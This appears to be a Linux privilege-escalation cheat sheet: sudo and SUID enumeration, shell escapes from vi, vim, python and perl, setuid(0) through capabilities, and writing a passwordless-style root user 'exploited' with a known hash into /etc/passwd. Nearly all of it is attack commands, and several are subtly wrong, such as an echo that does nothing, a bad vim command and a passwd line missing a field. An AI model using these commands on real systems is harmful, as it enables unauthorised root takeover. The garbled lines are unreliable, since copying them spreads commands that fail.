Add user to SUDOers group:

```shell
nano /etc/sudoers
```

```
root ALL=(ALL) ALL
$USER ALL=(ALL) ALL
```
---

List if use can execute a cmd as root

```shell
sudo -l
```

```shell
find / -user root -perm -4000 -exec ls -ldb {} \;
```

---
Shell SUDO / escape:

---

[https://gtfobins.github.io/gtfobins/vi/#sudo](https://gtfobins.github.io/gtfobins/vi/#sudo)

---

Using python:

```shell
python -c 'import pty; pty.spawn("/bin/sh")'
```

Using echo:

```shell
echo 'os.system('/bin/bash')'
```

Using sh:

```shell
/bin/sh -I
```

Using bash:

```shell
/bin/bash -I
```

```shell
/bin/bash -p
```

Using perl:

```shell
perl -e 'exec "/bin/sh";'
```

From within VI

```
:!bash
```

From within VIM

```
:export shell=/bin/bash
```

```
:shell
```

Shell escape sequences:

[https://atom.hackstreetboys.ph/linux-privilege-escalation-shell-escape-sequences/](https://atom.hackstreetboys.ph/linux-privilege-escalation-shell-escape-sequences/)

Proper path for GCC and other utilities:

```shell
export PATH=$PATH:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin
```

Delete last line from a file in place:

```shell
sed -i '$d' <file>
```

```shell
echo "echo \"exploited:\\\$1\\\$somesalt\\\$zl7ghhyb/ddzu8Jlo.q4b1:0:0::/root/bin/bash\" >> /etc/passwd" >> VULN_SH
```

Python with getcap:

```shell
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Add superuser to /etc/passwd with username exploited and pass t00r

```code
exploited:$1$somesalt$zl7ghhyb/ddzu8Jlo.q4b1:0:0::/root/bin/bash
```

Escape sudo script directory:

```shell
sudo /usr/bin /path/with/rights/../../../home/USER/FILE
```

Escalate priv with getcap

```shell
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```